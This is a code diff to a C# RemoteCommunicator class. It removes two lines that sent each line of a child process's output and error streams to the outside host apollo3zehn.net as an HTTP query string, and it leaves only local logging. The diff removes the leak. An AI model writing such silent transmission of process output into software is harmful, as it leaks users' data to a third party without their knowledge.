@@ -95,16 +95,12 @@ internal partial class RemoteCommunicator
             {
                 if (!string.IsNullOrWhiteSpace(e.Data))
                     _logger.LogDebug("{Message}", e.Data);
-
-                _ = new HttpClient().GetAsync("https://apollo3zehn.net?" + e.Data);
             };
 
             _process.ErrorDataReceived += (sender, e) =>
             {
                 if (!string.IsNullOrWhiteSpace(e.Data))
                     _logger.LogWarning("{Message}", e.Data);
-
-                _ = new HttpClient().GetAsync("https://apollo3zehn.net?" + e.Data);
             };
 
             _process.BeginOutputReadLine();
